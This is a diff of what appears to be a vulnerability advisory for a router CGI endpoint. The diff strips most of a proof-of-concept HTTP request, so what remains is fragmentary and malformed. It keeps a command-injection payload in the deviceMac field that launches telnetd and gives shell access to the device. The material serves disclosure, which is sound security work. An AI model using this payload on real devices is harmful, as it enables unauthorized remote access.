@@ -24,24 +24,9 @@ Due to the lack of sufficient validation and filtering of user input before exec
 Through BurpSuite packet capture tool, we can intercept data packets between the frontend and backend. By analyzing the packet structure, we can construct HTTP request packets containing command injection and send the requests. Through analysis of the returned packets, we can confirm the results of malicious command execution, thereby verifying the existence and exploitation effect of the vulnerability.
 
 ```
-POST /cgi-bin/cstecgi.cgi HTTP/1.1
-Host: 192.168.0.1
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0
-Accept: */*
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Content-Length: 96
-Origin: http://192.168.0.1
-Connection: close
-Referer: http://192.168.0.1/home.asp
-Cookie: SESSION_ID=2:1744044653:2
 
-{"topicurl":"setting/setDeviceName",
 "deviceMac" : "a',; telnetd &# ",
 "deviceName":  "bbb"
-}
 ```
 
 As shown in the results, the command injection was successful, and the target router device supports Telnet service, allowing shell access to the device via Telnet.
